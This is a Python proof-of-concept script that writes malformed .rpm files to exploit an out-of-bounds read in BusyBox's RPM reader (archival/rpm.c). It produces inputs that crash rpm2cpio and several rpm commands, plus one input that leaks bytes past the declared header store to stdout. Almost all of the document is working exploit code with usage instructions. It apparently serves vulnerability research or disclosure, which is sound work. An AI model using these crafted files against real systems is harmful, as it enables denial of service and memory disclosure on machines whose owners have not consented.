#!/usr/bin/env python3
"""
BBX-001 PoC input generator -- BusyBox RPM reader out-of-bounds read.

Crafts malformed .rpm files that make archival/rpm.c compute a pointer
`G.map + found->offset` far past the end of the mmap'd store (G.mapsize is
recorded at rpm.c:148 but never consulted), then dereference it in
rpm_getstr() / rpm_getint().

Layout produced (all fields big-endian on disk, per RPM spec):

  offset 0         : 96-byte lead (skipped by rpm_gettags())
  offset 96        : pass-0 header { magic=0x8eade801, entries=0, size=0 }
  offset 112       : pass-1 header { magic=0x8eade801, entries=N, size=S }
  offset 128       : N * 16-byte index entries { tag, type, offset, count }
  offset 128 + 16N : S-byte store

For entry i, rpm.c stores:  tag->offset = (128 + 16N) + ntohl(entry.offset)
and G.map points at file offset 0, so a huge entry.offset walks far outside
the mapping (mapping length = page_align(128 + 16N + S)).

Index entries must be sorted ascending by tag id because rpm_getstr() /
rpm_getint() use bsearch() over G.mytags.

Usage:
    python3 poc_bbx001_gen_rpm.py -o <outdir>
"""

import argparse
import os
import struct

RPM_LEAD_MAGIC = 0xEDABEEDB
RPM_HEADER_MAGICnVER = 0x8EADE801

# rpm.c type constants
RPM_INT8_TYPE = 2
RPM_INT16_TYPE = 3
RPM_INT32_TYPE = 4
RPM_STRING_TYPE = 6
RPM_STRING_ARRAY_TYPE = 8
RPM_I18NSTRING_TYPE = 9

TAG_NAME = 1000
TAG_FILEFLAGS = 1037
TAG_DIRINDEXES = 1116
TAG_BASENAMES = 1117
TAG_DIRNAMES = 1118
TAG_PAYLOADCOMPRESSOR = 1125

# 1 GiB past the store -> lands on unmapped pages -> SIGSEGV on first touch.
OOB_OFFSET = 0x40000000


def lead(name: bytes = b"bbx001") -> bytes:
    assert len(name) <= 66
    return struct.pack(
        ">IBBH H66sHH16s",
        RPM_LEAD_MAGIC,
        3, 0,            # major, minor
        0,               # type
        0,               # archnum
        name.ljust(66, b"\0"),
        1,               # osnum
        0,               # signature_type
        b"",
    )


def header(entries: int, size: int) -> bytes:
    return struct.pack(">IIII", RPM_HEADER_MAGICnVER, 0, entries, size)


def index_entry(tag: int, type_: int, offset: int, count: int) -> bytes:
    return struct.pack(">IIII", tag, type_, offset, count)


def build(tags, store: bytes = b"", declared_size: int = None) -> bytes:
    """tags: iterable of (tag, type, offset, count); sorted for us.

    declared_size overrides the store length written into header.size,
    letting the file carry bytes the header does not claim to own.
    """
    tags = sorted(tags, key=lambda t: t[0])
    dsize = len(store) if declared_size is None else declared_size
    blob = lead()
    blob += header(0, 0)                    # pass 0: signature header, 0 entries
    blob += header(len(tags), dsize)        # pass 1: main header
    for t in tags:
        blob += index_entry(*t)
    blob += store
    return blob


# --- Path A: rpm2cpio malicious.rpm ---------------------------------------
# rpm_getstr0(TAG_PAYLOADCOMPRESSOR) -> strcmp(str, "lzma") at rpm.c:539
# dereferences the OOB pointer.
PATH_A = build([
    (TAG_PAYLOADCOMPRESSOR, RPM_STRING_TYPE, OOB_OFFSET, 1),
])

# --- Path B: rpm -qpi malicious.rpm ---------------------------------------
# printf("%-12s: %s\n", "Name", rpm_getstr0(TAG_NAME)) -- OOB pointer fed
# straight to printf's strlen.
PATH_B = build([
    (TAG_NAME, RPM_STRING_TYPE, OOB_OFFSET, 1),
])

# --- Path C: rpm -qpl malicious.rpm ---------------------------------------
# loop_through_files() -> rpm_getint(TAG_DIRINDEXES, 0) ->
# ntohl(*(int32_t*)tmpint) at rpm.c:203 on the OOB pointer.
PATH_C = build([
    (TAG_DIRINDEXES, RPM_INT32_TYPE, OOB_OFFSET, 1),
    (TAG_BASENAMES, RPM_STRING_ARRAY_TYPE, OOB_OFFSET, 1),
])

# --- Path D: rpm -i malicious.rpm -----------------------------------------
# loop_through_files(TAG_BASENAMES, fileaction_dobackup) ->
# rpm_getint(TAG_FILEFLAGS, 0) and rpm_getstr(TAG_DIRNAMES, ...) OOB.
PATH_D = build([
    (TAG_FILEFLAGS, RPM_INT32_TYPE, OOB_OFFSET, 1),
    (TAG_DIRINDEXES, RPM_INT32_TYPE, OOB_OFFSET, 1),
    (TAG_BASENAMES, RPM_STRING_ARRAY_TYPE, OOB_OFFSET, 1),
    (TAG_DIRNAMES, RPM_STRING_ARRAY_TYPE, OOB_OFFSET, 1),
])

# --- Leak demo: OOB read past the *declared* store, no crash --------------
# header.size declares a 0-byte store, yet extra bytes follow the index in
# the file. rpm_gettags() never validates tag->offset against the declared
# store size, so TAG_NAME resolves to bytes the header does not own and
# `rpm -qpi` prints them to stdout -> deterministic information disclosure.
LEAK_STORE = b"LEAKED-PAST-DECLARED-STORE\0"
PATH_LEAK = build([
    (TAG_NAME, RPM_STRING_TYPE, 0, 1),  # -> G.map + (128+16) = LEAK_STORE
], store=LEAK_STORE, declared_size=0)

# --- Combined: one input that trips A, B, C and D -------------------------
COMBINED = build([
    (TAG_NAME, RPM_STRING_TYPE, OOB_OFFSET, 1),
    (TAG_FILEFLAGS, RPM_INT32_TYPE, OOB_OFFSET, 1),
    (TAG_DIRINDEXES, RPM_INT32_TYPE, OOB_OFFSET, 1),
    (TAG_BASENAMES, RPM_STRING_ARRAY_TYPE, OOB_OFFSET, 1),
    (TAG_DIRNAMES, RPM_STRING_ARRAY_TYPE, OOB_OFFSET, 1),
    (TAG_PAYLOADCOMPRESSOR, RPM_STRING_TYPE, OOB_OFFSET, 1),
])

CORPUS = {
    "bbx001_pathA_rpm2cpio.rpm": PATH_A,
    "bbx001_pathB_rpm_qpi.rpm": PATH_B,
    "bbx001_pathC_rpm_qpl.rpm": PATH_C,
    "bbx001_pathD_rpm_install.rpm": PATH_D,
    "bbx001_leak_declared_store.rpm": PATH_LEAK,
    "bbx001_all_paths.rpm": COMBINED,
}


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("-o", "--outdir", default=".", help="output directory")
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    for name, blob in CORPUS.items():
        path = os.path.join(args.outdir, name)
        with open(path, "wb") as f:
            f.write(blob)
        print(f"{path}: {len(blob)} bytes")


if __name__ == "__main__":
    main()
